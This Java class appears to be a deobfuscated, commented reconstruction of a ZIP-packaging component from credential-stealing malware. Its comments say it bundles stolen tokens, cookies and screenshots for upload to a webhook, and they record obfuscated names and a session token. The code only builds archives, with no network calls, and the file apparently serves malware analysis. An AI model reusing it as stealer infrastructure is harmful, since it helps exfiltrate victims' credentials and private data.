import java.io.ByteArrayOutputStream;
import java.io.Closeable;
import java.nio.charset.StandardCharsets;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

/**
 * In-memory ZIP file builder.
 * Obfuscated name: \u04ce
 *
 * Used to package stolen data (tokens, cookies, screenshots, etc.)
 * into a ZIP archive before sending to the webhook.
 *
 * The ZIP is built in memory (ByteArrayOutputStream) and returned
 * as a byte[] for multipart upload.
 *
 * Also stores a "webhook token" string (\u00fd field) that is set
 * by the webhook sender to track which webhook is being used.
 */
public class ZipBuilder implements Closeable {

    private final ByteArrayOutputStream buffer = new ByteArrayOutputStream();
    private final ZipOutputStream zip = new ZipOutputStream(buffer);

    // Webhook token — set externally to identify the webhook session
    // Decoded from obfuscated static field \u00fd
    private static String webhookToken;

    /**
     * Adds a text entry to the ZIP.
     * Converts the string to UTF-8 bytes and adds as a ZIP entry.
     *
     * @param entryName  The filename inside the ZIP (e.g. "tokens.txt")
     * @param content    The text content to add
     */
    public synchronized void addText(String entryName, String content) {
        if (webhookToken == null) return;  // Not initialized
        if (content == null || content.isEmpty()) return;
        addBytes(entryName, content.getBytes(StandardCharsets.UTF_8));
    }

    /**
     * Adds a binary entry to the ZIP.
     *
     * @param entryName  The filename inside the ZIP
     * @param data       The binary data to add
     */
    public synchronized void addBytes(String entryName, byte[] data) {
        if (webhookToken == null) return;
        if (data == null || data.length == 0) return;
        try {
            zip.putNextEntry(new ZipEntry(entryName));
            zip.write(data);
            zip.closeEntry();
        } catch (Exception ignored) {}
    }

    /**
     * Sets the ZIP comment (used to embed metadata).
     *
     * @param comment The comment string
     */
    public void setComment(String comment) {
        try {
            if (comment != null) zip.setComment(comment);
        } catch (Exception ignored) {}
    }

    /**
     * Finalizes the ZIP and returns the raw bytes.
     * After calling this, the ZIP is complete and ready for upload.
     *
     * @return ZIP file as byte array
     */
    public byte[] toBytes() {
        try { zip.finish(); } catch (Exception ignored) {}
        return buffer.toByteArray();
    }

    @Override
    public void close() {
        try { zip.close(); } catch (Exception ignored) {}
    }

    /**
     * Sets the webhook token (called during initialization).
     * The token is a short random string like "LfEIE" or "s0IG4"
     * used to identify the webhook session.
     *
     * @param token The webhook token string
     */
    public static void setWebhookToken(String token) {
        webhookToken = token;
    }

    /**
     * Gets the current webhook token.
     *
     * @return The webhook token, or null if not set
     */
    public static String getWebhookToken() {
        return webhookToken;
    }

    static {
        // Initialize with a default token check
        // In the obfuscated code: if (\u04ce.\u00ff() != null) { \u04ce.\u00fc("LfEIE"); }
        // This means: if already initialized, set token to "LfEIE"
        if (getWebhookToken() != null) {
            setWebhookToken("LfEIE");
        }
    }
}
